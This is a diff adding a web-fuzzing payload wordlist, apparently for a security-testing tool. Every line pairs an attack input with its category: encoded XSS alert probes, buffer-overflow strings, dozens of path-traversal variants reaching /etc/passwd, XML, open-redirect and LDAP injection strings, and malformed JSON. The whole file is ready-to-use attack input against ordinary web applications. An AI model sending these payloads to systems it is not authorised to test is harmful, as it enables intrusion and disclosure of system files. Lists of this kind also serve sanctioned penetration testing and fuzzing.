@@ -1,0 +1,110 @@
+Alert%281%29@single urlencode
+alert%25281%2529@double urlencode
+alert%2525281%252529@triple urlencode
+alert%252525281%25252529@quadruple urlencode
+alert%25252525281%2525252529@quintuple pentadruple urlencode
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@Buffer Overflow 128
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@Buffer Overflow 512
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@Buffer Overflow 2048
+/../../../../../etc/passwd%00@LFI NULLbyte
+/..\..\\..\..\\..\..\\..\..\\\@LFI dot sot slash Directory
+/../..//../..//../..//../..///@LFI dot sot slash Directory
+/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\@LFI dot sot slash Directory
+/.//..//.//..//.//..//.//..//.//..//.//..//.//..//.//..//@LFI dot sot slash Directory
+/.\..\.\..\.\..\.\..\.\..\.\..\.\..\@LFI dot sot slash Directory
+/./.././.././.././.././.././../@LFI dot sot slash Directory
+/.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\@LFI dot sot slash Directory
+/./\/././\/././\/././\/././\/././\/./@LFI dot sot slash Directory
+/..\\\..\\\..\\\..\\\..\\\..\\\@LFI dot sot slash Directory
+/..\\..\\..\\..\\..\\..\\..\\@LFI dot sot slash Directory
+/..///..///..///..///..///..///..///@LFI dot sot slash Directory
+/..//..//..//..//..//..//..//@LFI dot sot slash Directory
+/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c@LFI dot sot slash Directory
+////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f@LFI dot sot slash Directory
+/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c@LFI dot sot slash Directory
+/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\@LFI dot sot slash Directory
+/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c@LFI dot sot slash Directory
+/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f@LFI dot sot slash Directory
+/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/@LFI dot sot slash Directory
+/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f@LFI dot sot slash Directory
+/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c@LFI dot sot slash Directory
+/0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\@LFI dot sot slash Directory
+/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c@LFI dot sot slash Directory
+/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f@LFI dot sot slash Directory
+/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/@LFI dot sot slash Directory
+/..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f@LFI dot sot slash Directory
+/%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216@LFI dot sot slash Directory
+/%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\@LFI dot sot slash Directory
+/..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025@LFI dot sot slash Directory
+/..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8@LFI dot sot slash Directory
+/..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216@LFI dot sot slash Directory
+/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215@LFI dot sot slash Directory
+/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/@LFI dot sot slash Directory
+/..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215@LFI dot sot slash Directory
+/....\....\....\....\....\....\....\....\@LFI dot sot slash Directory
+/..../..../..../..../..../..../..../@LFI dot sot slash Directory
+/...\...\...\...\...\...\...\...\@LFI dot sot slash Directory
+/.../.../.../.../.../.../.../.../@LFI dot sot slash Directory
+//..\/..\/..\/..\/..\/..\/..\/..\@LFI dot sot slash Directory
+/\../\../\../\../\../\../\../@LFI dot sot slash Directory
+/%252e%252e%255c%252e%252e%255c%252e%252e%255c@LFI dot sot slash Directory
+/%252e%252e\%252e%252e\%252e%252e\%252e%252e\@LFI dot sot slash Directory
+/..%255c..%255c..%255c..%255c..%255c..%255c..%255c@LFI dot sot slash Directory
+/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c@LFI dot sot slash Directory
+/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\@LFI dot sot slash Directory
+/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c@LFI dot sot slash Directory
+/..\..\..\..\..\..\..\..\@LFI dot sot slash Directory
+/%252e%252e%252f%252e%252e%252f%252e%252e%252f@LFI dot sot slash Directory
+/%252e%252e/%252e%252e/%252e%252e/%252e%252e/@LFI dot sot slash Directory
+/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f@LFI dot sot slash Directory
+/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f@LFI dot sot slash Directory
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/@LFI dot sot slash Directory
+/..%2f..%2f..%2f..%2f..%2f..%2f..%2f@LFI dot sot slash Directory
+/../../../../../../../@LFI dot sot slash Directory
+/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\@LFI dot sot slash Directory
+../../../../../../../../../../@LFI dot sot slash Directory
+/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/@LFI dot sot slash Directory
+/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af@LFI dot sot slash Directory
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/@LFI dot sot slash Directory
+/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af@LFI dot sot slash Directory
+/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af@LFI dot sot slash Directory
+/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/@LFI dot sot slash Directory
+/%25c0%25ae%25c0%25ae%25c0%25af@LFI dot sot slash Directory
+/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c@LFI dot sot slash Directory
+/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\@LFI dot sot slash Directory
+/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c@LFI dot sot slash Directory
+/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c@LFI dot sot slash Directory
+/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\@LFI dot sot slash Directory
+/..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66@LFI dot sot slash Directory
+/%%32%65%%32%65/%%32%65%32%65/%32%65%%32%65/@LFI dot sot slash Directory
+/etc/passwd%00@LFI Interested Directory
+/etc%2fpasswd@LFI Interested Directory
+/etc%2fpasswd%00@LFI Interested Directory
+/etc%5cpasswd@LFI Interested Directory
+/etc%5cpasswd%00@LFI Interested Directory
+/etc%c0%afpasswd%00@LFI Interested Directory
+&apos;XoiZR@xml attacks
+&lt;%= Tnn96 %&gt;@xml attacks
+&lt;? Tnn96 ?&gt;@xml attacks
+///{target}@redirect injection
+////{target}@redirect injection
+/\{target}@redirect injection
+%2f{target}@redirect injection
+%2f$2f{target}@redirect injection
+%2f{target}%2f%2f@redirect injection
+$2f%2f{target}%2f%2f@redirect injection
+%2A%28%7C%28mail%3D%2A%29%29@LDAPi
+%2A%28%7C%28objectclass%3D%2A%29%29@LDAPi
+%2A%7C@LDAPi
+["1","2"]@JSON_Fuzzing
+["\x00"]@JSON_Fuzzing
+["\x00", "\x00"]@JSON_Fuzzing
+[{"1":"0"}]@JSON_Fuzzing
+["1",{"1":"0"}]@JSON_Fuzzing
+[1,{"1":"0"}]@JSON_Fuzzing
+[{"1":"0"},1]@JSON_Fuzzing
+[":test", "1"]@JSON_Fuzzing
+[":\x00", "1"]@JSON_Fuzzing
+":test"@JSON_Fuzzing
+"\"\\/Date(1335205592410)\\/\""@JSON_Fuzzing
+"\"\\/Date(-1)\\/\""@JSON_Fuzzing
